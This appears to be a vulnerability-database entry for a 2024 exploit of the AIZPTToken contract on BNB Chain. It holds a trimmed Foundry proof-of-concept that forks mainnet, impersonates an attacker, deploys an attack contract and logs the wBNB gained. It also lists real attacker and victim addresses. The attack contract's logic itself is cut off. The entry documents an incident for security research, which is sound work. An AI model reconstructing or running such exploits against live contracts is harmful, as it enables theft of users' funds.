# [?] AIZPTToken - Wrong Price Calculation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: AIZPTToken
Published: 2024-10-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/AIZPTToken_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 34.88 BNB (~$20K USD)
// Attacker : https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32
// Attack Contract : https://bscscan.com/address/0x8408497c18882bfb61be9204cfff530f4ee18320
// Vulnerable Contract : https://bscscan.com/address/0xbe779d420b7d573c08eee226b9958737b6218888
// Attack Tx : https://bscscan.com/tx/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;
address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;

contract AIZPTToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 42_846_998 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();
        vm.label(address(attackerC), "attackerC");

        attackerC.attack();

        console.log("Final balance in wBNB :", IERC20(weth).balanceOf(attacker));
    }
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/AIZPTToken_exp.sol_
